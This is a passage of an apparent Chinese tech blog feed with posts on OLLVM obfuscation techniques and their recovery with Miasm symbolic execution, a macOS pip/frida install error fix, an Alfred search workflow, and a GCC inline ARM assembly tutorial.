<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><hr>
<h1 id="OLLVM-混淆技术-amp-恢复手段"><a href="#OLLVM-混淆技术-amp-恢复手段" class="headerlink" title="OLLVM 混淆技术 &amp; 恢复手段"></a>OLLVM 混淆技术 &amp; 恢复手段</h1><p>原始案例：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">target_function</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> mod = n % <span class="number">4</span>;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> (mod == <span class="number">0</span>) result = (n | <span class="number">0xBAAAD0BF</span>) * (<span class="number">2</span> ^ n);</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mod == <span class="number">1</span>) result = (n &amp; <span class="number">0xBAAAD0BF</span>) * (<span class="number">3</span> + n);</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mod == <span class="number">2</span>) result = (n ^ <span class="number">0xBAAAD0BF</span>) * (<span class="number">4</span> | n);</div><div class="line">  <span class="keyword">else</span> result = (n + <span class="number">0xBAAAD0BF</span>) * (<span class="number">5</span> &amp; n);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>混淆的点：</p>
<ul>
<li>控制流混淆</li>
<li>基本块处理</li>
</ul>
<h2 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h2><p>这个概念我觉得是 OLLVM 使用的混淆技术里比较复杂的一种，不仅考验思路的严谨性，而且代码实现起来应该也很复杂。</p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>该技术 主要是针对 控制流的混淆，将原本很简单的执行流复杂化。原始条件被转换为CMOV条件传送指令，然后根据比较结果，在状态变量中设置下一个“相关块”。“相关块”就是没有经过混淆的函数的原始块。</p>
<p><img src="/include/img/reverse/control_flow_flattening.png" alt="demo 混淆以后"><br>采用该混淆技术以后，程序的流程变成了：<br><code>序言-&gt;（进入循环）主分发器-&gt;..子分发器/相关块..-&gt;预分发器（进入一下轮循环）-&gt;返回块</code></p>
<p><img src="/include/img/reverse/ollvm_控制流平坦原理图.png" alt="控制流平坦原理图"></p>
<p>看完上面的文字描述和 两张图以后，我其实还是挺模糊的。不理解如何保证自动化完成控制流的闭合，那么我就建议看看<a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening" target="_blank" rel="external">OLLVM 官方文档中关于Control Flow Flattening</a>的描述。</p>
<ul>
<li><p>混淆前的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> a = atoi(argv[<span class="number">1</span>]);</div><div class="line">  <span class="keyword">if</span>(a == <span class="number">0</span>)</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="keyword">return</span> <span class="number">10</span>;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>混淆后的 伪代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> a = atoi(argv[<span class="number">1</span>]);</div><div class="line">  <span class="keyword">int</span> b = <span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">    <span class="keyword">switch</span>(b) &#123;</div><div class="line">      <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">if</span>(a == <span class="number">0</span>)</div><div class="line">          b = <span class="number">1</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">          b = <span class="number">2</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">      <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">10</span>;</div><div class="line">      <span class="keyword">default</span>:</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>结合这个案例就清楚多了， 可以将混淆后的伪代码和混淆后的几个对象对应上了。<br><code>序言</code>：3-4行<br><code>主分发器</code>: #5 while 循环<br><code>相关块</code>: 13-16行 混淆前就包含的逻辑<br><code>子分发器</code>: #8 新增了一个判断条件，是控制流复杂<br><code>预分发器</code>: #6， #9， #11 通过增加一个变量(b) 结合switch语句，是控制流的规模增加。</p>
<p>其实<code>控制流平坦化</code>主要做手脚的部分就是<code>子分发器</code>和<code>预分发器</code>。通过在这2部分增加大量的无效逻辑干扰逆向人员静态分析。</p>
<h3 id="恢复手段"><a href="#恢复手段" class="headerlink" title="恢复手段"></a>恢复手段</h3><p>这里我们需要一个符号执行工具来遍历代码，并尝试计算每个基本块的目标终点。当出现判断条件分支时，它将帮助我们尝试运行并获取所有分支可能到达的目标地址列表。Miasm框架包含有一个符号执行引擎（支持x86 32位等架构），其基于自身的“中间表示”(IR)实现，并且可以通过反汇编器转换二进制代码到“中间表示”(IR)。</p>
<h2 id="虚假控制流"><a href="#虚假控制流" class="headerlink" title="虚假控制流"></a>虚假控制流</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>该技术是对基本块进行混淆，创建一个包含”不透明谓词”的新代码块。</p>
<p><strong>“不透明谓词”</strong>会生成条件跳转：可以跳转到真正的基本块或另一个包含垃圾指令的代码块。</p>
<p>我们可以同样使用前文中的符号执行方法，找到所有有用基本块并重建控制流。但还存在一个问题：“不透明谓词”，如果包含垃圾代码的基本块返回它的父节点块，这种情况下如果我们在符号执行过程中还按这个路径去跟踪，将导致陷入死循环。所以需要先解决“不透明谓词”问题，以避免垃圾代码块，直接找到正确的执行路径。</p>
<h3 id="恢复手段-1"><a href="#恢复手段-1" class="headerlink" title="恢复手段"></a>恢复手段</h3><p>首先需要识别”不透明谓词”,Miasm框架仍然可以帮助我们完成简化不透明谓词的任务，因为框架包含了一个基于自身IR(中间表示)的表达式简化引擎。我们还需加深对不透明谓词的了解。</p>
<p>但是 貌似OLLVM项目中生成”不透明谓词”时存在一个bug， 具体请查看原文。</p>
<h2 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h2><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><p>函数流程图“形状”没有改变，仍可以看到相同的条件分支，但是在“相关块”中，可以看到对输入值的计算过程变得更繁杂。</p>
<ul>
<li>不修改 函数原始的控制流</li>
<li>OLLVM项目把普通算术和布尔运算换为更复杂的操作。</li>
</ul>
<p>从OLLVM项目官网上我们可以看到，根据运算符不同，有以下几种指令被替换：+， – ，^，| ，&amp;</p>
<h3 id="恢复手段-2"><a href="#恢复手段-2" class="headerlink" title="恢复手段"></a>恢复手段</h3><p>这个方法对于所有指令的替换恢复都是相同的。如果是在闭源的混淆器中，我们就必须手动找到它们，将所有OLLVM替换公式添加到Miasm简化引擎后，就可以得到简化过的控制流。</p>
<h2 id="完整保护"><a href="#完整保护" class="headerlink" title="完整保护"></a>完整保护</h2><h3 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h3><p>这种技术就是将上面 介绍的所有混淆技术：指令替换、虚假控制流、不透明谓词、控制流平坦化 全局添加进来，让所有的混淆手段相互叠加达到最大效果。比如 指令替换还可以针对不透明谓词的代码。</p>
<h3 id="恢复手段-3"><a href="#恢复手段-3" class="headerlink" title="恢复手段"></a>恢复手段</h3><hr>
<h1 id="反混淆工具"><a href="#反混淆工具" class="headerlink" title="反混淆工具"></a>反混淆工具</h1><p>反obfuscation LLVM(简称为OLLVM)的工具市面上已经有了很多家，我还没有来的急一一去评测，上文中介绍『恢复手段』时基本都是使用的<a href="https://github.com/cea-sec/miasm" target="_blank" rel="external">Miasm 框架</a>, 另外还有：</p>
<ul>
<li><a href="https://github.com/anatolikalysch/VMAttack" target="_blank" rel="external">VMAttack</a></li>
<li><a href="http://blog.tetrane.com/2016/11/reversing-f4b-challenge-part1.html" target="_blank" rel="external">使用Reven的writeup</a></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="external">利用符号执行去除控制流平坦化</a></li>
<li><a href="http://blog.csdn.net/wangbaochu/article/details/45370543" target="_blank" rel="external">Android LLVM-Obfuscator C/C++ 混淆编译的深入研究</a></li>
</ul>
<p>后续会带来 android &amp; ios 平台 对抗OLLVM的案例。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;发现2017年代码混淆技术流行了起来，ios 和 android 上应用的都非常广泛。在这记录一下学习的一点新的，项目相关的案例要等项目接触，酌情选择一部分出来分享。&lt;/p&gt;
&lt;p&gt;本文参考了：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html&quot;&gt;Deobfuscation: recovering an OLLVM-protected program&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（&lt;a href=&quot;http://www.freebuf.com/articles/terminal/130142.html&quot;&gt;反混淆：恢复被OLLVM保护的程序&lt;/a&gt;） 帮助我快速入门OLLVM。&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="OLLVM" scheme="http://yoursite.com/tags/OLLVM/"/>
    
      <category term="混淆" scheme="http://yoursite.com/tags/%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>[Bug] pip 安装module的bug</title>
    <link href="http://yoursite.com/2017/05/22/Bug-pip-%E5%AE%89%E8%A3%85module%E7%9A%84bug/"/>
    <id>http://yoursite.com/2017/05/22/Bug-pip-安装module的bug/</id>
    <published>2017-05-22T06:17:39.000Z</published>
    <updated>2017-05-23T13:21:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>$ pip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 552, in resolve</div><div class="line">    raise DistributionNotFound(req)</div><div class="line">pkg_resources.DistributionNotFound: pip==9.0.1</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<h1 id="故事"><a href="#故事" class="headerlink" title="故事"></a>故事</h1><p>参考：<a href="https://www.zhihu.com/question/30941329" target="_blank" rel="external">Mac OS X 上如何切换默认的 Python 版本？</a></p>
<p>因为 mac 上自带的python 使用pip 安装失败， 是因为 SIP 对目录权限的限制，所以我自己安装python-2.7.13使用brew。<br>我之前一直 使用python-2.7.10, 将模块几乎都安装在 <code>/Library/Python/2.7/site-packages/</code>这里。</p>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>自从 有一次要升级frida 要安装frida 10.0.6, 安装新版本之前是可以使用但是pip 有下面bug。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜  Reverse  pip</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;/usr/local/bin/pip&quot;, line 6, in &lt;module&gt;</div><div class="line">    from pkg_resources import load_entry_point</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 2671, in &lt;module&gt;</div><div class="line">    working_set.require(__requires__)</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 654, in require</div><div class="line">    needed = self.resolve(parse_requirements(requirements))</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 552, in resolve</div><div class="line">    raise DistributionNotFound(req)</div><div class="line">pkg_resources.DistributionNotFound: pip==9.0.1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">* pypi  下载  egg</div><div class="line">* sudo easy_install  xx.egg</div></pre></td></tr></table></figure>
<p>下载frida10.0.6 的egg 文件，使用easy_install 安装以后，frida 也出现了 类似pip 的bug.<br>此时 将frida-10.0.6 默认安装在了 <code>/usr/local/lib</code> 目录，是因为我使用的 easy_install 在<code>/usr/local/bin</code> 目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  Reverse  frida</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;/usr/local/bin/frida&quot;, line 6, in &lt;module&gt;</div><div class="line">    from pkg_resources import load_entry_point</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 2675, in &lt;module&gt;</div><div class="line">    parse_requirements(__requires__), Environment()</div><div class="line">  File &quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&quot;, line 552, in resolve</div><div class="line">    raise DistributionNotFound(req)</div><div class="line">pkg_resources.DistributionNotFound: frida==10.0.6</div></pre></td></tr></table></figure>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>参考 <a href="https://github.com/Homebrew/legacy-homebrew/issues/26900" target="_blank" rel="external">brew 的issue</a></p>
<p>按照文章中所说出现bug的原因是 老版本的pip 还在pip的启动脚本。我查看了 <code>/usr/local/bin/pip</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line"></div><div class="line">所以我将`/usr/local/lib/python2.7/site-packages/frida-10.0.6-py2.7-macosx-10.12-x86_64.egg` 文件移动到了 `/Library/Python/2.7/site-packages` 目录下。  其实 只要不在 `/usr/local/lib` 目录下即可以。</div><div class="line"></div><div class="line">感觉是因为 python 环境变量 `echo $PYTHONPATH` 中没有包含 `/usr/local/lib` , 但是 我测试将 `/usr/local/lib/python2.7/site-packages/frida-10.0.6-py2.7-macosx-10.12-x86_64.egg`  放到其他不在 `$PYTHONPATH` 列表中的目录也可以工作了。 所以我现在 不确定 将egg 移走原因。</div></pre></td></tr></table></figure>
<p>.:/usr/lib/python2.7:/Library/Python/2.7/site-packages:/usr/lib/python2.7/lib-dynload:/usr/lib/python2.7/lib-tk:/usr/lib/python2.7/site-packages:/usr/lib/python2.7/plat-darwin:/usr/lib/python2.7/plat-mac:/Users/xxx/.python/2.7.10/site-packages/:/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python:/Users/xxx/.pylib/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">可以继续玩耍了。</div></pre></td></tr></table></figure></p>
<p>➜  Reverse  pip –version<br>pip 9.0.1 from /Library/Python/2.7/site-packages/pip-9.0.1-py2.7.egg (python 2.7)</p>
<p>➜  Reverse  frida  –version<br>10.0.6<br>```</p>
<h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><p><a href="https://gist.github.com/miminus/671de665a440ef12cafc31e7a97acc89" target="_blank" rel="external">为Mac 设置Python多版本开发环境</a>  这篇文章 里的 pyenv 我已经使用brew 安装， 看了 作者的介绍，我觉得适合我  测试一些工具。稍后尝试。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;$ pip&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; File &amp;quot;/Library/Python/2.7/site-packages/distribute-0.6.14-py2.7.egg/pkg_resources.py&amp;quot;, line 552, in resolve&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    raise DistributionNotFound(req)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pkg_resources.DistributionNotFound: pip==9.0.1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="bug" scheme="http://yoursite.com/tags/bug/"/>
    
  </entry>
  
  <entry>
    <title>Aflred 创建workflows</title>
    <link href="http://yoursite.com/2017/05/22/Aflred-%E5%88%9B%E5%BB%BAworkflows/"/>
    <id>http://yoursite.com/2017/05/22/Aflred-创建workflows/</id>
    <published>2017-05-22T04:49:30.000Z</published>
    <updated>2017-05-23T13:22:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Mac 上的Aflred 功能很强大，基本上算是Mac系统的『大管家』</p>
<p>按照我的使用习惯，基本将Aflred 的功能分成2部分。</p>
<ul>
<li>原生功能 ：指安装以后自带的功能</li>
<li>拓展功能 ：通过编写 Workflows 增强的功能<a id="more"></a>
</li>
</ul>
<h1 id="原生功能"><a href="#原生功能" class="headerlink" title="原生功能"></a>原生功能</h1><p><img src="/include/img/base_features.png" alt=""></p>
<p>原生功能包括了对mac 常用app的调用以及<code>本地文件搜索</code>。</p>
<p>像锁屏、关键、休眠等都是我常用的功能。</p>
<h1 id="拓展功能"><a href="#拓展功能" class="headerlink" title="拓展功能"></a>拓展功能</h1><p><img src="/include/img/workflows.png" alt=""></p>
<p>参考<a href="http://manan.org/2014/12/alfred-workflow-tutorial/" target="_blank" rel="external">Alfred workflow开发实例</a>这篇文章，我们开始写自己的Workflows。</p>
<p>四类对象:</p>
<ul>
<li>输入</li>
<li>输出</li>
<li>动作</li>
<li>触发</li>
</ul>
<p>每一种对象还包含 好几种Type， 这里不展开了感兴趣可以自己尝试。</p>
<h2 id="搜索公开情报的-WF"><a href="#搜索公开情报的-WF" class="headerlink" title="搜索公开情报的 WF"></a>搜索公开情报的 WF</h2><h3 id="使用Google-–-inurl"><a href="#使用Google-–-inurl" class="headerlink" title="使用Google – inurl"></a>使用Google – inurl</h3><p>对于程序员来说可能最重要的互联网工具就是Google，用好Goolge 可以大大提高工作效率。<br>特别是一些高级用法比如使用<code>inurl:</code> 可以在限定搜索url中含指定关键词的网页。<br>更多的使用方法：<a href="http://wdxtub.com/2016/03/26/google-tip/" target="_blank" rel="external">Google 搜索技巧</a></p>
<p><img src="/include/img/pi.png" alt=""></p>
<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>这个WF 只使用了 Input 和 Action 两个对象。<br><code>Input</code> : 创建<code>Keyword</code>类型的对象，设置 Aflred的搜索关键词。<br><code>Action</code>: 创建<code>Open URL</code>类型的对象，因为我们要使用Goolge inurl 搜索关键词。</p>
<p>当前创建了2个Input 和 3个Action，每个Action 代表1个要搜索的公开情报平台。</p>
<p>2个Input 对应的关键词：</p>
<ul>
<li><code>pi</code> 在所有收集的Platforms 搜索 关键次</li>
<li><code>pi-xw</code> 只在玄武实验室搜索</li>
</ul>
<p>3个Action 对应的Platform：</p>
<ul>
<li>xuanwulab.github.io</li>
<li>mdsec.co.uk</li>
<li>secspace.com</li>
</ul>
<p>在 Action 的URL 设置：<br><code>https://www.google.com/search?rlz=1C5CHFA_enJP663JP663&amp;q=inurl%3Axuanwulab.github.io++{query}</code></p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>后续只需要添加 Action 就可以了，如果需要单独搜索(pi-xx)就创建对应的Input.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Mac 上的Aflred 功能很强大，基本上算是Mac系统的『大管家』&lt;/p&gt;
&lt;p&gt;按照我的使用习惯，基本将Aflred 的功能分成2部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原生功能 ：指安装以后自带的功能&lt;/li&gt;
&lt;li&gt;拓展功能 ：通过编写 Workflows 增强的功能
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>C内敛汇编</title>
    <link href="http://yoursite.com/2017/05/18/%E5%BC%80%E5%8F%91/C%E5%86%85%E6%95%9B%E6%B1%87%E7%BC%96/"/>
    <id>http://yoursite.com/2017/05/18/开发/C内敛汇编/</id>
    <published>2017-05-18T07:01:39.000Z</published>
    <updated>2017-05-23T13:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：<a href="http://www.voidcn.com/blog/beyond702/article/p-6152486.html" target="_blank" rel="external">Arm汇编学习笔记(三)——GCC内联汇编</a></p>
<a id="more"></a>
<p>首先，C语言中为什么要内联汇编以及其带来的好处这个我就不说了。C语言中使用汇编要通过函数<code>asm()</code>，即<code>__asm__()</code>的别名，两者是一样的。</p>
<p>常见的内联汇编有下面两种形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">&quot;mov     r0, r0\n\t&quot;</div><div class="line">&quot;mov     r0, r0\n\t&quot;</div><div class="line">&quot;mov     r0, r0\n\t&quot;</div><div class="line">&quot;mov     r0, r0&quot;</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>例1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">&quot;mov %[result], %[value], ror #1&quot;</div><div class="line">: [result] &quot;=r&quot; (y)</div><div class="line">: [value] &quot;r&quot; (x)</div><div class="line">:</div><div class="line">);</div></pre></td></tr></table></figure>
<p>例2</p>
<p>第一种和一般汇编文件中的汇编程序是一的，这里不多说了。<br>着重看第二种，为什么要有第二种形式呢？这就和为什么内联汇编有很大关系了，一般都是在一个C的函数中会使用内联汇编，汇代码一般会与C函数的代码有数据交换，也就是说通过汇编代码来操作C代码中的一些变量数据，而C代码中的数据存放在内存还是寄存器，或者存放在哪个寄存器我们在写C代码的时候并不知道，所以不可能使用第一种内联汇编形式，那就必须要用第二种形式了。</p>
<h1 id="第二种汇编格式定义："><a href="#第二种汇编格式定义：" class="headerlink" title="第二种汇编格式定义："></a>第二种汇编格式定义：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">code    /*汇编指令*/</div><div class="line">: output operand list     /*输出操作数列表*/</div><div class="line">: input operand list      /*输入操作数列表*/</div><div class="line">: clobber list               /*被改变资源列表*/</div><div class="line">);</div></pre></td></tr></table></figure>
<p>可以内联汇编通过冒号将内容分成了四个部分，内联汇编和C操作数之前的关联性体现在上面的input和out操作数上。下面我们针对例2进行分析：</p>
<ul>
<li><p>汇编指令<br><code>mov %[result], %[value], ror #1</code></p>
</li>
<li><p>输出操作数列表，可选，每个输出数的符号名用方括号包围，后面跟一个约束串，然后再加上一个括号包围的C表达式，这个括号里的符号就是C语言代码中的变量。</p>
</li>
</ul>
<p><code>[result] &quot;=r&quot; (y) /*result：符号名   &quot;=r&quot;：约束串*    (y)：C表达式*/</code></p>
<ul>
<li><p>输入操作数列表，可选，语法上与输出操作数列表一样。括号中的x是C语言代码中的变量。<br><code>[value] &quot;r&quot; (x)</code></p>
</li>
<li><p>被改变资源列表，这里是空的，它主要是 <em>告诉编译器哪些资源发生了改变需要去更新</em> 。</p>
</li>
</ul>
<p>那么上面的”r”和”=r”是什么意思呢？</p>
<h2 id="operand"><a href="#operand" class="headerlink" title="operand"></a>operand</h2><table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>通用寄存器 r0-r15</td>
</tr>
<tr>
<td>m</td>
<td>有效的内存地址</td>
</tr>
<tr>
<td>I</td>
<td>数据处理中的立即数</td>
</tr>
<tr>
<td>X</td>
<td>只能 用于输出操作数列表</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>无</td>
<td>操作符只读</td>
</tr>
<tr>
<td>=</td>
<td>操作符只写</td>
</tr>
<tr>
<td>+</td>
<td>操作符 可读可写</td>
</tr>
<tr>
<td>&amp;</td>
<td>只能用于 <em>修饰输出操作数列表的操作符</em></td>
</tr>
</tbody>
</table>
<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>如果你曾经读过一些别人写的内联汇编代码就会发现与我们上面写的略有不同，是下面这种形式的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">asm(</div><div class="line">&quot;mov %0, %1, ror #1&quot;</div><div class="line">: &quot;=r&quot; (result)</div><div class="line">: &quot;r&quot; (value)</div><div class="line">:</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>例3</p>
<p>实际上是同一种形式，只不过例2的那种形式是从GCC3.1版本开始才支持的，而再次之前一直是例3的形式。我之前对”%0” “%1”一直很迷惑，操作数用一个带百分号的数字来表示，上述0%和1%分别表示第一个、第二个操作数。GCC的最新版本仍然支持上述语法，但明显，上述语法更容易出错，且难以维护：假设你写一个较长的内联汇编，然后需要在某个位置插入一个新的输出操作数，此时，之后的操作数都需要重新编号。</p>
<p>另外还有一点就是，你会经常看见<code>asm volatile()</code>这样的内联汇编，在asm后面会跟上一个volatile关键字，这是因为编译器会去优化你的代码，不同的C编译器优化的方式还不一样，而这些优化有时候会适得其反，或者运行的过程和你希望的不一样，甚至将你的汇编代码给优化掉。针对这一问题的解决方法是增加volatile属性，这一属性告诉编译器不要对本代码段进行优化。</p>
<h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p><a href="https://github.com/Fuzion24/AndroidHostileEnvironmentDetection/blob/master/app/jni/emudetect.c" target="_blank" rel="external">https://github.com/Fuzion24/AndroidHostileEnvironmentDetection/blob/master/app/jni/emudetect.c</a></p>
